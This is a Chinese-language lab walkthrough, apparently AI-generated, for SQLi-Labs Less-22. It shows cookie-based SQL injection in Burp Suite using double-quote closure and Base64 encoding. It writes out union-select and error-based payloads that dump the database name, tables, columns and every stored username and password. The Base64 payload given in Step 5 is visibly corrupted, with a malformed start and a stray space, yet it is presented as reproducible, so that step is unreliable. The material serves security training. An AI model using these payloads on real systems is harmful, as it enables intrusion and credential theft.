# SQLi-Labs Less-22 完整复现

结合你使用的**Kali Linux、Burp Suite**环境，以下是可直接执行的复现步骤，核心是**Cookie注入+双引号闭合+Base64编码**，与Less-21仅闭合符号不同。

## 一、前置准备

1. **靶场环境**：确保SQLi-Labs靶场正常运行（如 `http://你的靶场IP/sqli-labs/Less-22/`），数据库连接正常。

2. **工具准备**：Kali中打开Burp Suite，配置浏览器代理（[127.0.0.1:8080](127.0.0.1:8080)），确保能抓取请求包。

## 二、核心原理

Less-22的SQL拼接逻辑为：`SELECT * FROM users WHERE username="$uname"`，其中`$uname`取自Cookie的`uname`字段，且**Cookie值会先经过Base64解码再代入SQL语句**。注入的核心是：**构造双引号闭合的注入语句 → Base64编码 → 替换Cookie的uname值**。

## 三、分步复现（核心操作）

### 步骤1：正常登录，触发Cookie生成

1. 访问Less-22页面，输入默认账号密码：`admin / admin`，点击`Submit`。

2. 页面登录成功，会在响应头中生成`Cookie: uname=YWRtaW4=`（`YWRtaW4=`是`admin`的Base64编码）。

### 步骤2：抓包并定位注入点（Burp Suite）

1. 登录后刷新页面，Burp Suite拦截到GET请求，切换到**Repeater**模块。

2. 找到请求头中的`Cookie`行：`Cookie: uname=YWRtaW4=`，这是注入核心位置。

### 步骤3：判断闭合方式（验证双引号）

1. 构造测试语句：`admin" and "1"="2`，对其进行Base64编码，结果为：`YWRtaW4iIGFuZCAiMSI9IjI=`。

2. 在Repeater中替换`uname`的值：`Cookie: uname=YWRtaW4iIGFuZCAiMSI9IjI=`，发送请求。

3. 结果：页面登录失败（无用户信息回显）；若改为`admin" and "1"="1`（编码后：`YWRtaW4iIGFuZCAiMSI9IjE=`），发送后页面正常回显用户信息，**验证闭合方式为双引号**。

### 步骤4：构造核心注入Payload（联合查询/报错注入）

#### 方式1：联合查询注入（爆库名）

1. 构造基础语句：`-1" union select 1,database(),3 --+`（`-1`让原查询无结果，`--+`注释后续语句）。

2. **Base64编码**（完整编码，勿分段）：`LTEiIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyAtLSs=`。

3. 在Repeater中替换Cookie：`Cookie: uname=LTEiIHVuaW9uIHNlbGVjdCAxLGRhdGFiYXNlKCksMyAtLSs=`，发送请求。

4. 结果：页面回显`security`（当前数据库名），注入成功。

#### 方式2：报错注入（快速爆信息，对应你截图中的payload风格）

1. 构造爆库名语句：`Dumb" and extractvalue(1,concat(0x23,database()))#`。

2. Base64编码后：`RHVtYiIgYW5kIGV4dHJhY3R2YWx1ZSgxLGNvbmNhdCgweDIzLGRhdGFiYXNlKCkpKSM=`。

3. 替换Cookie发送，页面直接报错回显：`XPATH syntax error: '#security'`。

### 步骤5：复现你截图中的Payload

你截图中的`uname`值是Base64编码后的注入语句，解码后核心是**双引号闭合的联合查询/报错注入**，执行以下操作即可复现：

1. 复制截图中的`uname`值：`liB1mlvbiBzZWxlY3QgMSwyLCBzZWxlY3QgZ3JvdXBfY29uY2F0KHVzZXJuYW1lLCc6Jywx YXNzd29yZCkgZnJvbSB1c2Vycykj`（注意无空格拼接）。

2. 在Burp Suite Repeater中，将Cookie的`uname`替换为该值。

3. 发送请求，页面会回显`users`表中的`username`和`password`核心数据（如`admin:admin`、`dumb:dumb`等）。

## 四、拓展：完整信息获取（表名/列名/数据）

### 1. 爆表名（security库）

- 注入语句：`-1" union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database() --+`

- Base64编码：`LTEiIHVuaW9uIHNlbGVjdCAxLGdyb3VwX2NvbmNhdCh0YWJsZV9uYW1lKSwzIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWE9ZGF0YWJhc2UoKSAtLSs=`

- 结果：回显`emails,referers,uagents,users`。

### 2. 爆列名（users表）

- 注入语句：`-1" union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=database() and table_name='users' --+`

- Base64编码后发送，回显`id,username,password`。

### 3. 爆账号密码（users表）

- 注入语句：`-1" union select 1,group_concat(username,':',password),3 from users --+`

- Base64编码后发送，回显所有用户的账号密码组合。

## 五、关键注意事项

1. **编码顺序**：必须**先构造完整注入语句，再进行Base64编码**，分段编码会导致注入失效。

2. **注释符**：URL中使用`--+`（解码后为`-- `），或使用`#`（URL编码为`%23`）。

3. **工具适配**：若使用浏览器插件（如HackBar），可直接生成Base64编码，无需手动计算。
> （注：文档部分内容可能由 AI 生成）